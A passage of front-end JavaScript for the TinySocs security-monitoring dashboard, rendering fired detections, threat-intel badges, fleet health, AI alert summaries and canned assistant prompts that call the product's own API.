    const resp = await fetch(apiBase() + '/storage/emergency-purge', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({admin_password: pw}),
    });
    const d = await resp.json();
    if (d.error) {
      if (resultEl) resultEl.innerHTML = `<span style="color:var(--red)">${d.error}</span>`;
      btn.disabled = false;
      btn.textContent = 'Free Space Now';
      return;
    }
    if (d.ok && d.deleted_indices && d.deleted_indices.length > 0) {
      if (resultEl) resultEl.innerHTML = `<span style="color:var(--green)">Deleted ${d.deleted_indices.length} indices, freed ${d.freed_human} &mdash; disk now at ${d.disk_used_pct_after}%</span>`;
    } else {
      if (resultEl) resultEl.innerHTML = `<span style="color:var(--muted)">No indices to purge</span>`;
    }
    // Refresh storage widget after a short delay
    setTimeout(() => loadStorage(), 2000);
  } catch (e) {
    if (resultEl) resultEl.innerHTML = `<span style="color:var(--red)">Error: ${e.message}</span>`;
    btn.disabled = false;
    btn.textContent = 'Free Space Now';
  }
}

// ---- Threat Intel Enrichment ----
let _enrichmentCache = {};  // ioc_value -> enrichment data

async function enrichIP(ip) {
  if (_enrichmentCache[ip]) return _enrichmentCache[ip];
  try {
    const d = await fetchJSON(`/api/threat-intel/enrich?ip=${encodeURIComponent(ip)}`);
    if (d.ok && d.enrichment && d.enrichment[ip]) {
      _enrichmentCache[ip] = d.enrichment[ip];
      return d.enrichment[ip];
    }
  } catch(e) {}
  return null;
}

function threatBadgeHtml(enrichment, ioc) {
  if (!enrichment) return '';
  const level = enrichment.threat_level || 'none';
  const icons = {high:'&#x1F6E1;', medium:'&#x1F6E1;', low:'&#x1F6E1;', none:'&#x2705;'};
  return `<span class="threat-badge threat-${level}" onclick="event.stopPropagation(); showThreatPopover(event, '${escapeHtml(ioc)}')" title="Threat level: ${level}">${icons[level] || ''} ${level}</span>`;
}

function showThreatPopover(evt, ioc) {
  // Remove existing popover
  const existing = document.getElementById('threatPopover');
  if (existing) existing.remove();
  const data = _enrichmentCache[ioc];
  if (!data) return;
  let html = `<div class="threat-popover" id="threatPopover">`;
  html += `<div style="font-weight:600;margin-bottom:8px">${escapeHtml(ioc)} &mdash; Threat Level: ${(data.threat_level || 'none').toUpperCase()}</div>`;
  html += '<table>';
  for (const [provider, pdata] of Object.entries(data)) {
    if (provider === 'threat_level' || typeof pdata !== 'object') continue;
    html += `<tr><td colspan="2" class="provider-label" style="padding-top:6px">${escapeHtml(provider)}</td></tr>`;
    for (const [k, v] of Object.entries(pdata)) {
      html += `<tr><td style="color:var(--muted)">${escapeHtml(k)}</td><td>${escapeHtml(String(v))}</td></tr>`;
    }
  }
  html += '</table>';
  html += `<div style="text-align:right;margin-top:8px"><button onclick="document.getElementById('threatPopover').remove()" style="font-size:11px;padding:2px 10px;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:4px;cursor:pointer">Close</button></div>`;
  html += '</div>';
  const container = evt.target.closest('.detection-row') || document.body;
  container.insertAdjacentHTML('beforeend', html);
}

// ---- Fired Detections ----
let _detectionCache = [];
let _openDetectionIdx = -1;       // which row is currently expanded
let _detectionSummaries = {};     // idx -> summary text (persists across refresh)
let _detectionsPage = 0;
// Dynamic: fit detections to viewport (same pattern as Event Explorer)
let _DETECTIONS_PER_PAGE = Math.max(5, Math.floor((window.innerHeight - 120 - 150) / 42));

async function loadDetections() {
  const el = document.getElementById('detections-content');
  let dUrl = `${apiBase()}/detections/fired?hours=${hours}&limit=50`;
  const fhD = focusedHostname();
  if (fhD) dUrl += `&hostname=${encodeURIComponent(fhD)}`;
  const d = await fetchJSON(dUrl);
  if (d.error && !d.detections?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
  _detectionCache = d.detections || [];
  renderDetections();
}

function renderDetections() {
  const el = document.getElementById('detections-content');
  const filter = (document.getElementById('detStatusFilter') || {}).value || 'active';
  let detections = _detectionCache;
  let filtered = detections;
  if (filter === 'active') {
    filtered = detections.filter(d => d.status !== 'dismissed');
  } else if (filter !== 'all') {
    filtered = detections.filter(d => d.status === filter);
  }
  if (!filtered.length) { el.innerHTML = '<div class="empty">No detections match this filter</div>'; return; }
  const filteredMap = filtered.map(det => detections.indexOf(det));

  // Pagination
  const totalItems = filtered.length;
  const totalPages = Math.ceil(totalItems / _DETECTIONS_PER_PAGE);
  if (_detectionsPage >= totalPages) _detectionsPage = totalPages - 1;
  if (_detectionsPage < 0) _detectionsPage = 0;
  const pageStart = _detectionsPage * _DETECTIONS_PER_PAGE;
  const pageFiltered = filtered.slice(pageStart, pageStart + _DETECTIONS_PER_PAGE);
  const pageMap = filteredMap.slice(pageStart, pageStart + _DETECTIONS_PER_PAGE);

  let html = '';
  for (let pi = 0; pi < pageFiltered.length; pi++) {
    const i = pageMap[pi];  // index into _detectionCache
    const det = detections[i];
    const ts = det.timestamp ? timeAgo(det.timestamp) : '';
    const evtCount = det.event_count || det.matched_events || 0;
    const isOpen = (i === _openDetectionIdx);

    const detStatus = det.status || 'new';
    const detTags = det.tags || [];
    const statusColors = {new:'#e67e22', acknowledged:'#27ae60', dismissed:'#7f8c8d'};
    const statusColor = statusColors[detStatus] || '#e67e22';

    html += `<div class="detection-row" onclick="toggleDetection(${i})">`;
    html += '<div class="detection-row-header">';
    html += `<span style="font-size:10px;padding:2px 7px;border-radius:3px;background:${statusColor};color:#fff;text-transform:uppercase;flex-shrink:0;font-weight:600">${detStatus}</span>`;
    html += severityBadge(det.severity);
    html += `<span class="rule-name">${escapeHtml(det.rule_name || det.rule_id || 'Unknown Rule')}</span>`;
    if (detTags.length) {
      for (const tag of detTags) {
        html += `<span style="font-size:10px;padding:1px 5px;border-radius:3px;background:var(--accent);color:#fff;flex-shrink:0">${escapeHtml(tag)}</span>`;
      }
    }
    html += `<span class="det-meta">${escapeHtml(det.host || '')}</span>`;
    html += `<span class="det-meta">${evtCount} events</span>`;
    html += `<span class="det-meta">${ts}</span>`;
    html += '</div>';

    // Expandable detail section — restore open state after refresh
    html += `<div class="detection-detail${isOpen ? ' open' : ''}" id="det-detail-${i}">`;
    html += '<table>';
    html += `<tr><td>Rule ID</td><td><code>${escapeHtml(det.rule_id || '')}</code></td></tr>`;
    html += `<tr><td>Rule Name</td><td>${escapeHtml(det.rule_name || '')}</td></tr>`;
    html += `<tr><td>Severity</td><td>${severityBadge(det.severity)}</td></tr>`;
    html += `<tr><td>Host</td><td>${escapeHtml(det.host || 'N/A')}</td></tr>`;
    html += `<tr><td>Description</td><td>${escapeHtml(det.description || 'No description')}</td></tr>`;
    html += `<tr><td>Event Count</td><td>${det.event_count || 0}</td></tr>`;
    html += `<tr><td>Matched</td><td>${det.matched_events || 0}</td></tr>`;
    html += `<tr><td>First Seen</td><td>${det.first_seen ? new Date(det.first_seen).toLocaleString() : 'N/A'}</td></tr>`;
    html += `<tr><td>Last Seen</td><td>${det.last_seen ? new Date(det.last_seen).toLocaleString() : 'N/A'}</td></tr>`;
    html += `<tr><td>Timestamp</td><td>${det.timestamp ? new Date(det.timestamp).toLocaleString() : 'N/A'}</td></tr>`;
    // Threat intel enrichment row (populated async)
    const srcIp = det.source_ip || det.group_key || '';
    if (srcIp && /^[0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}[.][0-9]{1,3}$/.test(srcIp)) {
      const cached = _enrichmentCache[srcIp];
      const badge = cached ? threatBadgeHtml(cached, srcIp) : `<span id="enrich-${i}" style="font-size:11px;color:var(--muted)">Loading...</span>`;
      html += `<tr><td>Threat Intel</td><td>${escapeHtml(srcIp)} ${badge}</td></tr>`;
      if (!cached) {
        // Fire async enrichment
        (function(idx, ip) {
          enrichIP(ip).then(data => {
            const el = document.getElementById('enrich-' + idx);
            if (el && data) el.outerHTML = threatBadgeHtml(data, ip);
            else if (el) el.textContent = 'No data';
          });
        })(i, srcIp);
      }
    }
    html += '</table>';

    // Action buttons row 1: investigate
    const prevSum = _detectionSummaries[i];
    html += '<div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">';
    html += `<button class="btn-summarize" style="background:#8e44ad" onclick="event.stopPropagation(); showInLogs(${i})">Show in Logs</button>`;
    if (_llmConfigured) {
      const btnLabel = prevSum ? 'Refresh Summary' : 'AI Summary';
      html += `<button class="btn-summarize" id="btn-sum-${i}" onclick="event.stopPropagation(); summarizeDetection(${i})">${btnLabel}</button>`;
      html += `<button class="btn-summarize" style="background:var(--green)" onclick="event.stopPropagation(); askAboutAlert(${i})">Discuss with Assistant</button>`;
    } else {
      html += `<button class="btn-summarize" disabled title="Configure an LLM provider in Settings to enable AI summaries" style="opacity:0.4;cursor:default">AI Summary (not configured)</button>`;
    }
    html += '</div>';

    // Action buttons row 2: tags (left) + status actions (right)
    html += '<div style="display:flex;gap:6px;margin-top:6px;align-items:center">';
    html += `<span style="color:var(--muted);font-size:11px">Tags:</span>`;
    const tagList = ['investigating','false-positive','escalated','resolved'];
    for (const tag of tagList) {
      const isActive = detTags.includes(tag);
      const tagStyle = isActive
        ? 'background:var(--accent);color:#fff'
        : 'background:var(--bg);color:var(--muted);border:1px solid var(--border)';
      html += `<button style="font-size:10px;padding:2px 6px;border-radius:3px;cursor:pointer;border:none;${tagStyle}" onclick="event.stopPropagation(); toggleDetectionTag(${i},'${tag}')">${tag}</button>`;
    }
    html += '<span style="flex:1"></span>';
    if (detStatus === 'new') {
      html += `<button style="font-size:11px;padding:3px 12px;border-radius:4px;cursor:pointer;border:none;background:#2980b9;color:#fff" onclick="event.stopPropagation(); setDetectionStatus(${i},'acknowledged')">Acknowledge</button>`;
      html += `<button style="font-size:11px;padding:3px 12px;border-radius:4px;cursor:pointer;border:none;background:#95a5a6;color:#fff" onclick="event.stopPropagation(); setDetectionStatus(${i},'dismissed')">Dismiss</button>`;
    } else if (detStatus === 'acknowledged') {
      html += `<button style="font-size:11px;padding:3px 12px;border-radius:4px;cursor:pointer;border:none;background:#95a5a6;color:#fff" onclick="event.stopPropagation(); setDetectionStatus(${i},'dismissed')">Dismiss</button>`;
      html += `<button style="font-size:11px;padding:3px 12px;border-radius:4px;cursor:pointer;border:none;background:#d35400;color:#fff" onclick="event.stopPropagation(); setDetectionStatus(${i},'new')">Reopen</button>`;
    } else {
      html += `<button style="font-size:11px;padding:3px 12px;border-radius:4px;cursor:pointer;border:none;background:#d35400;color:#fff" onclick="event.stopPropagation(); setDetectionStatus(${i},'new')">Reopen</button>`;
    }
    html += '</div>';

    if (prevSum) {
      html += `<div class="ai-summary" id="ai-sum-${i}">${escapeHtml(prevSum)}</div>`;
    } else {
      html += `<div class="ai-summary" id="ai-sum-${i}" style="display:none"></div>`;
    }
    html += '</div>';

    html += '</div>';
  }

  el.innerHTML = html;

  // Pager — rendered outside the scrollable content area
  let detPager = document.getElementById('detections-pager');
  if (!detPager) {
    detPager = document.createElement('div');
    detPager.id = 'detections-pager';
    detPager.className = 'pager';
    el.parentNode.appendChild(detPager);
  }
  if (totalPages > 1) {
    detPager.innerHTML = `<button onclick="detectionsPagePrev()" ${_detectionsPage === 0 ? 'disabled' : ''}>&laquo; Prev</button>`
      + `<span>Page ${_detectionsPage + 1} of ${totalPages} (${totalItems} detections)</span>`
      + `<button onclick="detectionsPageNext()" ${_detectionsPage >= totalPages - 1 ? 'disabled' : ''}>Next &raquo;</button>`;
    detPager.style.display = '';
  } else {
    detPager.style.display = 'none';
  }
}

function detectionsPagePrev() { _detectionsPage = Math.max(0, _detectionsPage - 1); _openDetectionIdx = -1; renderDetections(); }
function detectionsPageNext() { _detectionsPage++; _openDetectionIdx = -1; renderDetections(); }

function toggleDetection(idx) {
  const detail = document.getElementById('det-detail-' + idx);
  if (!detail) return;
  const wasOpen = detail.classList.contains('open');
  // Close any currently open row
  if (_openDetectionIdx >= 0 && _openDetectionIdx !== idx) {
    const prev = document.getElementById('det-detail-' + _openDetectionIdx);
    if (prev) prev.classList.remove('open');
  }
  if (wasOpen) {
    detail.classList.remove('open');
    _openDetectionIdx = -1;
  } else {
    detail.classList.add('open');
    _openDetectionIdx = idx;
  }
}

async function setDetectionStatus(idx, status) {
  const det = _detectionCache[idx];
  if (!det) return;
  try {
    const r = await fetch(BASE + '/api/detections/' + encodeURIComponent(det.id) + '/status', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({status}),
    });
    const d = await r.json();
    if (d.ok) {
      det.status = status;
      loadDetections();  // Re-render to update badges
    } else {
      alert('Failed: ' + (d.error || 'unknown'));
    }
  } catch(e) { alert('Error: ' + e.message); }
}

async function toggleDetectionTag(idx, tag) {
  const det = _detectionCache[idx];
  if (!det) return;
  let tags = det.tags || [];
  if (tags.includes(tag)) {
    tags = tags.filter(t => t !== tag);
  } else {
    tags.push(tag);
  }
  try {
    const r = await fetch(BASE + '/api/detections/' + encodeURIComponent(det.id) + '/tags', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({tags}),
    });
    const d = await r.json();
    if (d.ok) {
      det.tags = d.tags;
      loadDetections();  // Re-render to update tag pills
    } else {
      alert('Failed: ' + (d.error || 'unknown'));
    }
  } catch(e) { alert('Error: ' + e.message); }
}

async function summarizeDetection(idx) {
  const btn = document.getElementById('btn-sum-' + idx);
  const sumEl = document.getElementById('ai-sum-' + idx);
  const alertData = _detectionCache[idx];
  if (!alertData) return;

  btn.disabled = true;
  btn.textContent = 'Summarizing...';
  sumEl.style.display = 'block';
  sumEl.textContent = 'Generating AI summary...';
  sumEl.style.color = 'var(--muted)';
  sumEl.style.fontStyle = 'italic';

  try {
    const r = await fetch(BASE + '/api/detections/summarize', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({alert: alertData}),
    });
    const d = await r.json();
    sumEl.style.color = '';
    sumEl.style.fontStyle = '';

    if (d.error === true) {
      sumEl.textContent = d.summary || 'LLM summarization failed';
      sumEl.style.color = 'var(--red)';
    } else {
      sumEl.textContent = d.summary;
      _detectionSummaries[idx] = d.summary;  // cache for refresh persistence
    }
    btn.textContent = 'Refresh Summary';
    btn.disabled = false;
  } catch(e) {
    sumEl.textContent = 'Error: ' + e.message;
    sumEl.style.color = 'var(--red)';
    btn.textContent = 'AI Summary';
    btn.disabled = false;
  }
}

function askAboutAlert(idx) {
  const det = _detectionCache[idx];
  if (!det) return;

  // Build a concise context prompt from the alert
  const ruleName = det.rule_name || det.rule_id || 'Unknown';
  const severity = det.severity || 'unknown';
  const host = det.host || 'unknown host';
  const desc = det.description || '';
  const evtCount = det.event_count || det.matched_events || 0;
  const ts = det.timestamp ? new Date(det.timestamp).toLocaleString() : '';

  const firstSeen = det.first_seen || '';
  const lastSeen = det.last_seen || '';
  const ruleId = det.rule_id || ruleName;

  const prompt = `Hey, I have an alert I'd like your help with:\n` +
    `Rule: ${ruleName} (rule_id: ${ruleId}), Severity: ${severity}, Host: ${host}, ` +
    `${evtCount} events` +
    (firstSeen ? `, First seen: ${firstSeen}` : '') +
    (lastSeen ? `, Last seen: ${lastSeen}` : '') +
    (desc ? `, Description: ${desc}` : '') +
    `\n\nCan you look into this for me? Search the alert index for rule_id:"${ruleId}" ` +
    `and also search the winlog index for activity on host ${host} around that time. ` +
    `Tell me what happened in simple terms.`;

  // Put the prompt into the chat input and send
  const chatInput = document.getElementById('chatInput');
  chatInput.value = prompt;
  sendChat();

  // Scroll the assistant panel into view
  const assistant = document.querySelector('.assistant-card');
  if (assistant) assistant.scrollIntoView({behavior: 'smooth', block: 'start'});
}

function askAIAboutWidget(widgetId) {
  const prompts = {
    summary: () => {
      const el = document.getElementById('summary-content');
      const text = el ? el.innerText.substring(0, 500) : '';
      return `Analyze the current alert summary for me. Here's what the dashboard shows:\n${text}\n\nWhat patterns do you see? Are there any concerns?`;
    },
    timeline: () => {
      return `Look at the alert timeline for the last ${hours} hours. Search the alerts index and tell me about any trends, spikes, or patterns you see.`;
    },
    detections: () => {
      const count = _detectionCache ? _detectionCache.length : 0;
      const sevs = {};
      (_detectionCache || []).forEach(d => { sevs[d.severity] = (sevs[d.severity]||0) + 1; });
      const sevStr = Object.entries(sevs).map(([k,v]) => `${v} ${k}`).join(', ');
      return `I have ${count} active fired detections (${sevStr}). Can you review them and tell me which ones I should prioritize? Search the alerts index for recent detections.`;
    },
    fleet: () => {
      const el = document.getElementById('fleet-content');
      const text = el ? el.innerText.substring(0, 500) : '';
      return `Summarize the fleet health status for me. Here's what the dashboard shows:\n${text}\n\nAre there any hosts that need attention?`;
    },
    compliance: () => {
      const fw = (document.getElementById('complianceFramework') || {}).value || '';
      const cov = (document.getElementById('comp-coverage') || {}).innerText || '';
      return `Analyze our compliance coverage for the ${fw} framework. Current coverage is ${cov}. What are the biggest gaps and what should we prioritize to improve coverage?`;
    },
    mitre: () => {
      return `Review our MITRE ATT&CK coverage. What techniques are we missing detection coverage for? Which gaps are the most critical to address?`;
    },
    explorer: () => {
      const idx = (document.getElementById('eventIndex') || {}).value || '';
      const range = (document.getElementById('eventTimeRange') || {}).value || '24h';
      const query = (document.getElementById('eventQuery') || {}).value || '';
      const el = document.getElementById('events-content');
      const text = el ? el.innerText.substring(0, 500) : '';
      let prompt = `Give me an overview of recent activity in the ${idx} index (last ${range}).`;
      if (query) prompt += ` I'm currently filtering with: ${query}.`;
      prompt += `\n\nHere's a snapshot of what the Event Explorer shows:\n${text}\n\nWhat notable events or patterns do you see? Is there anything unusual I should investigate?`;
      return prompt;
    },
    sites: () => {
      const countEl = document.getElementById('sitesCount');
      const count = countEl ? countEl.innerText : '';
      return `I'm looking at the Sites tab in the TinySocs Dashboard. ${count ? 'Currently showing ' + count + '.' : ''}\n\nCan you explain:\n1. What is a "Site" in TinySocs federation?\n2. How do I bring a new site online? (install steps, what to enter during setup)\n3. How do I add an existing site from this dashboard?\n\nPlease keep the explanation simple and non-technical.`;
    },
    rules: () => {
      const el = document.getElementById('rules-content');
      const text = el ? el.innerText.substring(0, 500) : '';
      return `I'm looking at the Alert Rules in TinySocs. Here's what I see:\n${text}\n\nCan you explain:\n1. What are detection rules and how do they work in TinySocs?\n2. How do I create a new rule using the rule builder?\n3. How do I upload a rule pack (YAML/JSON)?\n4. How do I tune rules — adjust thresholds, group-by fields, or set cooldown periods?\n5. How do I suppress false positives or disable noisy rules?`;
    },
    storage: () => {
      const el = document.getElementById('storage-content');
      const text = el ? el.innerText.substring(0, 500) : '';
      return `Analyze the storage status for me. Here's what the dashboard shows:\n${text}\n\nAre there any concerns about disk usage or data retention? Should I adjust retention settings?`;
    },
  };
  const fn = prompts[widgetId];
  if (!fn) return;
  const chatInput = document.getElementById('chatInput');
  chatInput.value = fn();
  sendChat();
  const assistant = document.querySelector('.assistant-card');
  if (assistant) assistant.scrollIntoView({behavior: 'smooth', block: 'start'});
}

function showInLogs(idx) {
  const det = _detectionCache[idx];
  if (!det) return;

  const host = det.host || '';
  const firstSeen = det.first_seen || '';
  const lastSeen = det.last_seen || '';

  // Build a KQL query that targets the host and time window (±5 min)
  let kql = '';
  if (host) kql += `winlog.computer_name:"${host}"`;
  if (firstSeen) {
    // Widen by 5 minutes either side to capture surrounding context
    const start = new Date(new Date(firstSeen).getTime() - 5 * 60000).toISOString();
    const end = lastSeen
      ? new Date(new Date(lastSeen).getTime() + 5 * 60000).toISOString()
      : new Date(new Date(firstSeen).getTime() + 10 * 60000).toISOString();
    if (kql) kql += ' AND ';
    kql += `@timestamp >= '${start}' AND @timestamp <= '${end}'`;
  }

  // Set the Event Explorer to winlog index + populate query + run search
  // Use "All time" since the absolute timestamps are already in the KQL
  document.getElementById('eventIndex').value = 'tinysocs-winlog-*';
  document.getElementById('eventTimeRange').value = '';
  document.getElementById('eventQuery').value = kql;
  loadEvents();

  // Scroll Event Explorer into view
  const explorer = document.getElementById('event-explorer-card');
  ensureCardVisible('explorer');
  if (explorer) explorer.scrollIntoView({behavior: 'smooth', block: 'start'});
}

let _fleetCache = [];
let _openFleetIdx = -1;
let _fleetPage = 0;
const _FLEET_PER_PAGE = 20;
let _fleetVersionMap = {};
let _threatIntelStatus = null;

async function loadFleet() {
  const el = document.getElementById('fleet-content');
  const d = await fetchJSON(apiBase() + '/fleet/health');
  if (d.error && !d.hosts?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }
  _fleetCache = d.hosts || [];
  // Fetch version status for drift badges and banner
  try {
    const vs = await fetchJSON('/api/version/status');
    _fleetVersionMap = {};
    if (vs.fleet_versions) {
      for (const fv of vs.fleet_versions) {
        _fleetVersionMap[fv.hostname] = fv.status;
      }
    }
    // Show/hide version drift banner (suppress in demo mode — it's synthetic data)
    const banner = document.getElementById('versionDriftBanner');
    const bannerText = document.getElementById('versionDriftText');
    const isDemoMode = !!document.getElementById('demoBanner');
    if (banner && vs.has_outdated && !isDemoMode) {
      const minor = vs.summary?.outdated_minor || 0;
      const major = vs.summary?.outdated_major || 0;
      const parts = [];
      if (major > 0) parts.push(major + ' major');
      if (minor > 0) parts.push(minor + ' minor');
      bannerText.textContent = 'Version drift detected: ' + parts.join(', ') + ' outdated agent(s). Expected: ' + (vs.manifest?.current_version || '?') + '. Click to view fleet details.';
      banner.style.display = 'block';
      banner.style.background = major > 0 ? 'var(--red)' : 'var(--orange)';
    } else if (banner) {
      banner.style.display = 'none';
    }
  } catch(e) {
    _fleetVersionMap = {};
  }
  // Fetch threat intel provider status
  try {
    const ti = await fetchJSON('/api/threat-intel/status');
    _threatIntelStatus = ti.ok ? ti : null;
  } catch(e) {
    _threatIntelStatus = null;
  }
  renderFleet();
  // Update Event Flow host filter dropdown and auto-load fleet-wide timeline
  _updateTimelineFilterFromFleet();
  if (!_hostTimelineHost && _activeTab === 'fleet') refreshHostTimeline();
}

function renderFleet() {
  const el = document.getElementById('fleet-content');
  const hosts = _fleetCache;
  if (!hosts.length) { el.innerHTML = '<div class="empty">No hosts reporting</div>'; return; }

  // Pagination
  const totalItems = hosts.length;
  const totalPages = Math.ceil(totalItems / _FLEET_PER_PAGE);
  if (_fleetPage >= totalPages) _fleetPage = totalPages - 1;
  if (_fleetPage < 0) _fleetPage = 0;
  const pageStart = _fleetPage * _FLEET_PER_PAGE;
  const pageHosts = hosts.slice(pageStart, pageStart + _FLEET_PER_PAGE);

  let html = '<table><tr><th>Host</th><th>Events (24h)</th><th>Alerts</th><th>Version</th><th>Last Seen</th></tr>';
  for (let pi = 0; pi < pageHosts.length; pi++) {
    const i = pageStart + pi;  // index into _fleetCache
    const h = pageHosts[pi];
    const ago = h.last_seen ? timeAgo(h.last_seen) : 'unknown';
    const alertBadge = h.alert_count > 0
      ? `<span style="background:var(--red);color:#fff;padding:1px 6px;border-radius:4px;font-size:11px">${h.alert_count}</span>`
      : `<span style="color:var(--muted)">0</span>`;
    const verStatus = _fleetVersionMap[h.hostname] || 'unknown';
    const verColor = verStatus === 'current' ? 'var(--green)' : verStatus === 'outdated-minor' ? 'var(--yellow)' : verStatus === 'outdated-major' ? 'var(--red)' : 'var(--muted)';
    const verLabel = h.agent_version || 'N/A';
    const versionBadge = `<span style="background:${verColor};color:#fff;padding:1px 6px;border-radius:4px;font-size:11px">${escapeHtml(verLabel)}</span>`;
    html += `<tr style="cursor:pointer" onclick="toggleFleetDetail(${i})">`;
    html += `<td style="font-weight:600;color:var(--accent)">${escapeHtml(h.hostname)}</td>`;
    html += `<td>${h.event_count}</td>`;
    html += `<td>${alertBadge}</td>`;
    html += `<td>${versionBadge}</td>`;
    html += `<td>${ago}</td>`;
    html += `</tr>`;

    // Expandable detail row
    const isOpen = (_openFleetIdx === i);
    html += `<tr id="fleet-detail-${i}" style="display:${isOpen ? 'table-row' : 'none'}">`;
    html += `<td colspan="5" style="padding:10px 16px;background:var(--bg);border-bottom:1px solid var(--border)">`;

    const firstAgo = h.first_seen ? timeAgo(h.first_seen) : 'N/A';
    const hbAgo = h.heartbeat_ts ? timeAgo(h.heartbeat_ts) : 'No heartbeat';
    const shipAgo = h.last_ship_time ? timeAgo(h.last_ship_time) : 'N/A';

    html += `<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px 24px;font-size:12px">`;
    html += `<div><span style="color:var(--muted)">First Seen (24h):</span> ${firstAgo}</div>`;
    html += `<div><span style="color:var(--muted)">Last Seen:</span> ${ago}</div>`;
    html += `<div><span style="color:var(--muted)">Agent Version:</span> ${escapeHtml(h.agent_version || 'Unknown')}</div>`;
    html += `<div><span style="color:var(--muted)">Uptime:</span> ${escapeHtml(h.uptime || 'Unknown')}</div>`;
    html += `<div><span style="color:var(--muted)">Last Heartbeat:</span> ${hbAgo}</div>`;
    html += `<div><span style="color:var(--muted)">Events Shipped:</span> ${(h.events_shipped || 0).toLocaleString()}</div>`;

    html += `<div><span style="color:var(--muted)">Top Channels:</span> <span id="fleet-channels-${i}">${h._channels_loaded ? escapeHtml((h.top_channels || []).map(c => c.channel + ' (' + c.count + ')').join(', ') || 'None') : '<em style="color:var(--muted)">Loading...</em>'}</span></div>`;
    html += `<div><span style="color:var(--muted)">Top Event IDs:</span> <span id="fleet-evtids-${i}">${h._channels_loaded ? escapeHtml((h.top_event_ids || []).map(e => e.event_id + ' (' + e.count + ')').join(', ') || 'None') : '<em style="color:var(--muted)">Loading...</em>'}</span></div>`;

    const sevs = h.alert_severities || {};
    const sevStr = Object.entries(sevs).map(([k,v]) => `${k}: ${v}`).join(', ') || 'None';
    html += `<div><span style="color:var(--muted)">Alerts by Severity:</span> ${escapeHtml(sevStr)}</div>`;
    const dets = (h.active_detections || []).map(d => escapeHtml(d)).join(', ') || 'None';
    html += `<div><span style="color:var(--muted)">Active Detections:</span> ${dets}</div>`;
    // FIM status — check if host has TinySocs-FIM channel events (lazy-loaded)
    let fimLabel;
    if (h._channels_loaded) {
      const fimChannel = (h.top_channels || []).find(c => c.channel === 'TinySocs-FIM');
      fimLabel = fimChannel ? '<span style="color:var(--green)">Active</span> (' + fimChannel.count + ' events)' : '<span style="color:var(--muted)">No FIM events</span>';
    } else {
      fimLabel = '<em style="color:var(--muted)">Loading...</em>';
    }
    html += `<div><span style="color:var(--muted)">FIM Status:</span> <span id="fleet-fim-${i}">${fimLabel}</span></div>`;
    // Threat intel status (global, same for all hosts)
    var tiLabel = '<span style="color:var(--muted)">Not configured</span>';
    if (_threatIntelStatus) {
      const configured = (_threatIntelStatus.providers || []).filter(function(p){ return p.configured; });
      if (configured.length > 0) {
        tiLabel = '<span style="color:var(--green)">' + configured.length + ' provider(s)</span> (' + configured.map(function(p){ return escapeHtml(p.name); }).join(', ') + ')';
      }
    }
    html += `<div><span style="color:var(--muted)">Threat Intel:</span> ${tiLabel}</div>`;
    html += `</div>`;

    html += `<div style="margin-top:8px;display:flex;gap:6px">`;
    html += `<button class="btn-summarize" style="background:#8e44ad;font-size:11px;padding:3px 10px" onclick="event.stopPropagation(); viewHostLogs('${escapeHtml(h.hostname)}')">View Logs</button>`;
    html += `<button class="btn-summarize" style="background:var(--accent);font-size:11px;padding:3px 10px" onclick="event.stopPropagation(); viewHostAlerts('${escapeHtml(h.hostname)}')">View Alerts</button>`;
    html += `</div>`;

    html += `</td></tr>`;
  }
  html += '</table>';

  // Pager
  if (totalPages > 1) {
    html += `<div class="pager">`;
    html += `<button onclick="fleetPagePrev()" ${_fleetPage === 0 ? 'disabled' : ''}>&laquo; Prev</button>`;
    html += `<span>Page ${_fleetPage + 1} of ${totalPages} (${totalItems} hosts)</span>`;
    html += `<button onclick="fleetPageNext()" ${_fleetPage >= totalPages - 1 ? 'disabled' : ''}>Next &raquo;</button>`;
    html += '</div>';
  }

  el.innerHTML = html;
}

function fleetPagePrev() { _fleetPage = Math.max(0, _fleetPage - 1); _openFleetIdx = -1; renderFleet(); }
function fleetPageNext() { _fleetPage++; _openFleetIdx = -1; renderFleet(); }

function toggleFleetDetail(idx) {
  const row = document.getElementById('fleet-detail-' + idx);
  if (!row) return;
  if (_openFleetIdx === idx) {
    row.style.display = 'none';
    _openFleetIdx = -1;
  } else {
    // Close previous
    if (_openFleetIdx >= 0) {
      const prev = document.getElementById('fleet-detail-' + _openFleetIdx);
      if (prev) prev.style.display = 'none';
    }
    row.style.display = 'table-row';
    _openFleetIdx = idx;
    // Lazy-load host detail (top channels, event IDs)
    const h = _fleetCache[idx];
    if (h && !h._channels_loaded) {
      fetchJSON(apiBase() + `/fleet/host-detail?hostname=${encodeURIComponent(h.hostname)}`).then(d => {
        h.top_channels = d.top_channels || [];
        h.top_event_ids = d.top_event_ids || [];
        h._channels_loaded = true;
        const chEl = document.getElementById('fleet-channels-' + idx);
        const evEl = document.getElementById('fleet-evtids-' + idx);
        if (chEl) chEl.textContent = h.top_channels.map(c => c.channel + ' (' + c.count + ')').join(', ') || 'None';
        if (evEl) evEl.textContent = h.top_event_ids.map(e => e.event_id + ' (' + e.count + ')').join(', ') || 'None';
        // Update FIM status
        const fimEl = document.getElementById('fleet-fim-' + idx);
        if (fimEl) {
          const fimChannel = h.top_channels.find(c => c.channel === 'TinySocs-FIM');
          fimEl.innerHTML = fimChannel ? '<span style="color:var(--green)">Active</span> (' + fimChannel.count + ' events)' : '<span style="color:var(--muted)">No FIM events</span>';
        }
      });
    }
  }
}

function viewHostLogs(hostname) {
  document.getElementById('eventIndex').value = 'tinysocs-winlog-*';
  document.getElementById('eventQuery').value = `winlog.computer_name:"${hostname}"`;
  document.getElementById('eventTimeRange').value = '24h';
  loadEvents();
  const explorer = document.getElementById('event-explorer-card');
  ensureCardVisible('explorer');
  if (explorer) explorer.scrollIntoView({behavior: 'smooth', block: 'start'});
}

function viewHostAlerts(hostname) {
  document.getElementById('eventIndex').value = 'tinysocs-alerts-*';
  document.getElementById('eventQuery').value = `source.computer_name:"${hostname}"`;
  document.getElementById('eventTimeRange').value = '24h';
  loadEvents();
  const explorer = document.getElementById('event-explorer-card');
  ensureCardVisible('explorer');
